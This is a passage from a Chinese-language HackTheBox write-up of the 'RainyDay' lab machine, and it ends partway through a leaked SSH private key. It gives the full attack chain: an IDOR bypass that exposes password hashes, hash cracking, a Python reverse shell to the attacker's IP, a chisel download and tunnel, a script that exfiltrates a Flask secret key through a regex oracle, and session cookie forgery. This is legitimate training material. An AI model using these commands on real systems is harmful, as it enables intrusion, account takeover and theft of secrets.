---
title: RainyDay - HackTheBox
url: https://darkwing.moe/2022/10/18/RainyDay-HackTheBox/
source: 喵喵喵喵
date: 2022-10-19
fetch_date: 2025-10-03T20:12:24.286319
---

# RainyDay - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

RainyDay - HackTheBox

# RainyDay - HackTheBox

##### 2022-10-18

#### TOC

1. [1. 基本信息](#基本信息)
   1. [1.1. 10.10.11.184](#10-10-11-184)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. 子域名扫描](#子域名扫描)
4. [4. 目录扫描](#目录扫描)
   1. [4.1. api/user](#api-user)
   2. [4.2. hash crack](#hash-crack)
5. [5. Containers](#Containers)
   1. [5.1. chisel](#chisel)
6. [6. dev.rainycloud.htb](#dev-rainycloud-htb)
   1. [6.1. healthcheck](#healthcheck)
   2. [6.2. SECRET\_KEY](#SECRET-KEY)
   3. [6.3. file\_fuzz.py](#file-fuzz-py)
   4. [6.4. jack secrets](#jack-secrets)
   5. [6.5. jack\_id\_rsa](#jack-id-rsa)
7. [7. user flag](#user-flag)
8. [8. jack\_adm](#jack-adm)
   1. [8.1. 沙盒逃逸](#沙盒逃逸)
9. [9. 提权信息](#提权信息)
10. [10. root flag](#root-flag)
    1. [10.1. shadow](#shadow)
    2. [10.2. root\_id\_rsa](#root-id-rsa)
11. [11. 参考资料](#参考资料)

# RainyDay - HackTheBox

2022-10-18

# 基本信息

* <https://www.hackthebox.com/home/machines/profile/502>
* ## 10.10.11.184

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022101801.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.184 Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-18 13:01 CST Nmap scan report for 10.10.11.184 Host is up (0.21s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   256 48dde361dc5d5878f881dd6172fe6581 (ECDSA) |_  256 adbf0bc8520f49a9a0ac682a2525cd6d (ED25519) 80/tcp open  http    nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://rainycloud.htb |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 77.90 seconds ``` |

## 80

需要加hosts,一个hosting service：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.184 rainycloud.htb ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022101802.jpg)

注册功能不可用，登录错误时源码中提示信息，知道路径和后端使用python：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022101803.jpg)

# 子域名扫描

子域名可以发现一个dev,响应403：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u "http://rainycloud.htb/" -H 'Host: FUZZ.rainycloud.htb' -fs 229  dev                     [Status: 403, Size: 26, Words: 5, Lines: 1, Duration: 264ms] ``` |

# 目录扫描

目录扫描发现api：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 ``` | ``` gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u http://rainycloud.htb  /api                  (Status: 308) [Size: 239] [--> http://rainycloud.htb/api/] /login                (Status: 200) [Size: 3254] /logout               (Status: 302) [Size: 189] [--> /] /new                  (Status: 302) [Size: 199] [--> /login] /register             (Status: 200) [Size: 3686] ``` |

## api/user

能发现应该是存在3个用户，但直接访问提示不允许查看其他用户信息，简单的绕过：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ``` | ``` gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u http://rainycloud.htb/api/user/ --exclude-length 3  /01                   (Status: 200) [Size: 50] /03                   (Status: 200) [Size: 50] /1                    (Status: 200) [Size: 50] /02                   (Status: 200) [Size: 50] /2                    (Status: 200) [Size: 50] /3                    (Status: 200) [Size: 50]  $ curl "http://rainycloud.htb/api/user/1" {"Error":"Not allowed to view other users info!"}  $ curl "http://rainycloud.htb/api/user/1.0" {"id":1,"password":"$2a$10$bit.DrTClexd4.wVpTQYb.FpxdGFNPdsVX8fjFYknhDwSxNJh.O.O","username":"jack"}  {"id":2,"password":"$2a$05$x4nSvCqGHZBmBQnmNM2nXeWDzVvvsXaJiHsSv1pwZnxrcBFbOibZS","username":"root"} {"id":3,"password":"$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG","username":"gary"} ``` |

## hash crack

得到的三条hash进行破解，能解出来gary的密码：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  rubberducky      (?) ``` |

# Containers

得到的账号密码登录，创建一个容器，容器中运行任意命令，得到容器shell：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022101804.jpg)

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022101805.jpg)

## chisel

前面的结果发现有dev子域名，外部访问是403，考虑打通隧道后访问：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 ``` | ``` # local ./chisel_1.7.0-rc7_darwin_amd64 server -p 9999 --reverse  # 容器内 wget http://10.10.14.15:7777/chisel_1.7.6_linux_amd64 chmod +x chisel_1.7.6_linux_amd64 ./chisel_1.7.6_linux_amd64 client --max-retry-count=1 10.10.14.15:9999 R:8888:172.18.0.1:80 ``` |

然后添加hosts：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 127.0.0.1     dev.rainycloud.htb ``` |

然后可以访问到dev：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022101806.jpg)

# dev.rainycloud.htb

dev也有一些api，其中有一个healthcheck：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022101807.jpg)

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022101808.jpg)

## healthcheck

这个接口支持post请求，需要的参数根据前面得到的响应构造：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022101809.jpg)

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022101810.jpg)

很明显是提供正则匹配对应文件内容，结果为true和false，那就可以fuzz出任意文件内容了

## SECRET\_KEY

根据前面的信息可以知道是python，所以fuzz SECRET\_KEY：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` file=/var/www/rainycloud/FUZZ.py&type=custom&pattern=^SECRET_KEY.*' ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022101811.jpg)

fuzz出内容：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67 ``` |

## file\_fuzz.py

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ``` | ``` import string import requests import json  allchars = string.printable cookies = {'session': 'session_cookie'}  s = requests.Session() pattern = ""  while True:     for c in allchars:         try:             rsp = s.post('http://dev.rainycloud.htb:8888/api/healthcheck', {                 'file': '/var/www/rainycloud/secrets.py',                 'type': 'custom',                 'pattern': "^SECRET_KEY = '" + pattern + c + ".*"             }, cookies=cookies)             if json.loads(rsp.content)['result']:                 pattern += c                 print(pattern)                 break             else:                 print(c)         except Exception:             print(rsp.content) ``` |

## jack secrets

有了secret，就可以伪造任意ookie了，直接修改为前面得到的另一个用户jack：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` flask-unsign --sign --cookie "{'username': 'jack'}" --secret 'f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67'  eyJ1c2VybmFtZSI6ImphY2sifQ.Y05Gog.GRPXrP7KBA6mP1OiM9H9cWyiWFk ``` |

替换cookie，可以看到jack用户的secrets容器：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022101812.jpg)

同样的方法拿到这个容器shell,查看进程发现一个sleep，这个进程有一个挂载，得到jack的私钥：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022101813.jpg)

## jack\_id\_rsa

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 ``` | ``` -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEA7Ce/LA...